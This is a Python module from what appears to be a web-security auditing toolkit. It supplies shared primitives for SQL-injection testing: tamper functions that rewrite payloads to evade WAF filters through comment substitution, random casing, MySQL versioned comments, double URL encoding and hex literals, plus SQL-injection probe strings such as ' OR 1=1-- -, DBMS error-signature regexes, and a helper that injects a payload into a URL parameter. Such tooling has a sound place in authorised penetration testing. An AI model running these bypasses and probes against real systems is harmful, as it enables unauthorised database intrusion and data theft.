#!/usr/bin/env python3
"""
auditing_tools/tampers.py — Shared Tamper & SQLi-Detection Primitives
═══════════════════════════════════════════════════════════════════════════════

Single source of truth for:
  • Tamper transformations (WAF-bypass payload rewrites)
  • The DEFAULT_TAMPERS set (top-5 most valuable)
  • A compact DBMS error-signature matcher
  • URL injection helpers (rebuild a query string for a given param)

Used by:
  • auditing_tools/sqli_finder.py       (payload transforms)
  • recon_tools/param_discovery.py      (Phase 4 pre-check)

All transforms preserve the payload's SQL semantics on at least one major
DBMS, so a DBMS-specific error after tampering is a genuine injection signal
(not a syntax artifact of the tamper itself).
"""

from __future__ import annotations

import re
import urllib.parse
from typing import Callable, Optional

# ═════════════════════════════════════════════════════════════════════════════
#  TAMPER TRANSFORMS
# ═════════════════════════════════════════════════════════════════════════════

def tamper_case(payload: str) -> str:
    """Randomized case per character — defeats case-sensitive keyword filters."""
    import random
    return "".join(
        c.upper() if random.random() < 0.5 else c.lower()
        for c in payload
    )


def tamper_space_to_comment(payload: str) -> str:
    """Replace every whitespace run with /**/ — universal WAF bypass."""
    return re.sub(r"\s+", "/**/", payload)


def tamper_space_to_plus(payload: str) -> str:
    """Replace spaces with '+' — decodes to space on form-encoded bodies."""
    return payload.replace(" ", "+")


def tamper_whitespace(payload: str) -> str:
    """
    Replace each space with a randomly chosen whitespace char
    (tab, newline, CRLF, vertical tab). SQL parsers treat all as whitespace
    but naive WAFs that match literal ' ' miss them.
    """
    import random
    choices = ["\t", "\n", "\r\n", "\v", " "]
    return "".join(random.choice(choices) if c == " " else c for c in payload)


def tamper_comment_flood(payload: str) -> str:
    """Wrap SQL keywords in MySQL versioned comments: /*!50000KW*/"""
    keywords = ["UNION", "SELECT", "AND", "OR", "SLEEP", "WAITFOR", "DELAY", "FROM"]
    out = payload
    for kw in keywords:
        out = re.sub(rf"\b{kw}\b", f"/*!50000{kw}*/", out, flags=re.IGNORECASE)
    return out


def tamper_double_url(payload: str) -> str:
    """Double URL-encode — defeats single-decode WAFs on double-decoding servers."""
    once = urllib.parse.quote(payload, safe="")
    return urllib.parse.quote(once, safe="")


def tamper_hex_keywords(payload: str) -> str:
    """Convert string literals to MySQL 0xHEX form — defeats string filters."""
    def _repl(m: re.Match) -> str:
        return f"0x{m.group(1).encode().hex()}"
    return re.sub(r"'([^']*)'", _repl, payload)


# ═════════════════════════════════════════════════════════════════════════════
#  REGISTRY
# ═════════════════════════════════════════════════════════════════════════════

TAMPERS: dict[str, Callable[[str], str]] = {
    "space2comment":   tamper_space_to_comment,
    "case":            tamper_case,
    "whitespace":      tamper_whitespace,
    "comment-flood":   tamper_comment_flood,
    "space2plus":      tamper_space_to_plus,
    "double-url":      tamper_double_url,
    "hex-literals":    tamper_hex_keywords,
}

# The top-5 most valuable tampers. Safe across MySQL / PostgreSQL / MSSQL /
# Oracle / SQLite for error-based detection. Use these when no preference is
# configured.
DEFAULT_TAMPERS: list[str] = [
    "space2comment",   # universal WAF bypass, no syntax change
    "case",            # cheap, universal
    "whitespace",      # space-only-filter bypass, no syntax change
    "comment-flood",   # keyword-filter bypass (MySQL/MariaDB)
    "space2plus",      # form-encoded space bypass
]


def apply_tampers(
    payload: str, names: Optional[list[str]] = None,
) -> list[tuple[str, str]]:
    """
    Apply the named tampers to `payload`.

    Returns a list of (tamper_name, transformed_payload) tuples. The tamper
    name is the empty string when no tamper was applied (i.e. raw payload).
    """
    if names is None:
        names = DEFAULT_TAMPERS
    out: list[tuple[str, str]] = []
    for name in names:
        fn = TAMPERS.get(name)
        if not fn:
            continue
        try:
            transformed = fn(payload)
        except Exception:
            continue
        if transformed and transformed != payload:
            out.append((name, transformed))
    return out


# ═════════════════════════════════════════════════════════════════════════════
#  DBMS ERROR SIGNATURES (compact)
# ═════════════════════════════════════════════════════════════════════════════

DBMS_ERROR_PATTERNS: dict[str, list[str]] = {
    "MySQL": [
        r"you have an error in your sql syntax",
        r"warning.*mysql_",
        r"mysql_fetch",
        r"check the manual that corresponds to your mysql",
        r"unclosed quotation mark after the character string",
    ],
    "PostgreSQL": [
        r"pg_query\(\)",
        r"pg_exec\(\)",
        r"psql:",
        r"syntax error at or near",
        r"unterminated quoted string",
        r"invalid input syntax for integer",
    ],
    "MSSQL": [
        r"microsoft sql server",
        r"unclosed quotation mark",
        r"incorrect syntax near",
        r"odbc sql server driver",
        r"system\.data\.sqlclient",
    ],
    "Oracle": [
        r"ora-\d{5}",
        r"oracle error",
        r"quoted string not properly terminated",
        r"sql command not properly ended",
        r"ojdbc",
    ],
    "SQLite": [
        r"sqlite_",
        r"sqlite3::",
        r"unrecognized token:",
        r"no such table",
    ],
}


def dbms_from_error(text: str) -> tuple[Optional[str], Optional[str]]:
    """
    Scan `text` (lowercased internally) for a DBMS-specific error signature.

    Returns (dbms, matched_pattern) or (None, None).
    """
    if not text:
        return None, None
    low = text.lower()
    for dbms, patterns in DBMS_ERROR_PATTERNS.items():
        for pat in patterns:
            if re.search(pat, low, re.I):
                return dbms, pat
    return None, None


# ── Quick-detection probe set (for pre-checks) ──────────────────────────
SQLI_ERROR_PROBES: list[str] = [
    "'", "\"", "')", "\")", "';", "\";",
    "'--", "\"--", "'/*", "' OR 1=1-- -",
]


# ═════════════════════════════════════════════════════════════════════════════
#  URL INJECTION HELPER
# ═════════════════════════════════════════════════════════════════════════════

def rebuild_url_with_payload(base_url: str, param: str, value: str) -> str:
    """
    Return `base_url` with `param=<value>`:
      • If `param` already appears in the query string → replace its value.
      • Otherwise → append `param=<value>`.

    The value is URL-encoded once.
    """
    parsed = urllib.parse.urlparse(base_url)
    encoded = urllib.parse.quote(value, safe="")

    pairs: list[str] = []
    found = False
    for pair in (parsed.query.split("&") if parsed.query else []):
        if "=" in pair:
            k, _ = pair.split("=", 1)
            if urllib.parse.unquote(k) == param:
                pairs.append(f"{k}={encoded}")
                found = True
                continue
        pairs.append(pair)
    if not found:
        pairs.append(f"{param}={encoded}")
    return urllib.parse.urlunparse(parsed._replace(query="&".join(pairs)))
